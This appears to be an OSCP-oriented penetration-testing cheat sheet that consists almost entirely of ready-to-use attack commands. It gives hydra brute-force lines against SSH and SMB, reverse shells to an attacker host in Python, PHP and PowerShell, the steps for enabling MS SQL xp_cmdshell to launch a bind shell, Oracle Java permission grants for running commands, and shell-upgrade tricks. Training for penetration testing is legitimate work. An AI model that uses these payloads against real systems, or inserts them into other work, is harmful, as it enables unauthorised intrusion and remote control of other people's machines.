# Offensive Security Testing Guide
This cheat sheet is the compilation of commands to exploit the vulnerable machines. The commands below may not be enough for you to obtain your Offensive Security Certified Professional (OSCP).

## Dictionary Attack
```bash
hydra -L <user_dict> -P <pwd_dict> 192.168.56.1 smb
hydra -L <user_dict> -P <pwd_dict> 192.168.56.1 ssh
```

```bash
fcrackzip -u -D -p <dictionary_file> <zip_file>
```

## Code Execution
### Python 

```python 
import subprocess
subprocess.check_output(['whoami'])
```

```python 
import os
import sys

os.system('nc -e /bin/bash <attacker_ip> 8099')
```

### PHP
```php
<?php passthru("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip_address> 8099 > /tmp/f"); ?>
```

### MS SQL
```sql
EXEC SP_CONFIGURE N'show advanced options', 1
go
EXEC SP_CONFIGURE N'xp_cmdshell', 1
go
RECONFIGURE
go
xp_cmdshell 'cd C:\<path_to_bind_shell>\ & <bind_shell_name>.exe';
go
```

### Oracle iSQL* Plus
```sql
exec dbms_java.grant_permission( 'SYSTEM','SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');

begin
  dbms_java.grant_permission
      ('SYSTEM',
       'java.io.FilePermission',
       '<<ALL FILES>>',
       'execute');
  dbms_java.grant_permission
      ('SYSTEM',
       'java.lang.RuntimePermission',
       '*',
       'writeFileDescriptor' );
end;

exec javacmd('<command>');
```

### Power Shell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.56.101',8099);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## TTY Shell

### Python
```python
which python
which bash
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Perl
```perl
/usr/bin/perl -e 'exec "/bin/sh"'
```

### VIM
```bash
:set shell=/bin/bash
:shell
```

### AWK
```bash
awk 'BEGIN {system("/bin/sh")}'
```

## File Transfer
### Remote Desktop
```
rdesktop -u <username> -p <password> -r disk:tmp=~/Desktop 127.0.0.1:8080
```
